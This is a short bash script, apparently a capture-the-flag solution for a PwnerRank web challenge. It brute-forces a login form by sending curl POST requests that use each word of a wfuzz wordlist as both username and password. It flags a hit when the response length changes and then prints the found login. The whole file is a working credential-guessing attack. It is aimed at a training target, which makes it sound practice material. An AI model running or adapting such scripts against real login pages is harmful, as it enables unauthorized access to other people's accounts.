#!/bin/bash
# PwnerRank - CTF
# Task: Web Exploitation/Password guessing attack
# The atribute 'Accept-Encoding' has a especial purpose

WORDLIST="/usr/share/wordlists/wfuzz/general/common.txt"

while read PASSWORD; do
	curl -sv 'http://web.challenges.pwnerrank.com/9076ed9ad63a7cb3ecbaf02bfc299287/' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
	-H 'Accept-Encoding: gzip,deflate' \
	-H 'Accept-Language: en-US' \
	-H 'Connection: keep-alive' \
	-H 'Host: web.challenges.pwnerrank.com' \
	-H 'Referer: http://web.challenges.pwnerrank.com/9076ed9ad63a7cb3ecbaf02bfc299287/' \
	-H 'User-Agent: Mozilla/5.0 (X11; Linux i686; rv:47.0) Gecko/20100101 Firefox/47.0' \
	-H 'Content-Type: application/x-www-form-urlencoded' \
	--data "username=$PASSWORD&password=$PASSWORD" 2>&1 | grep -o "Content-Length: 1970" &> /dev/null

	if [ $? -ne 0 ]; then
		echo -e "Login: $PASSWORD\nSenha: $PASSWORD\n"
		break
	fi
done < $WORDLIST
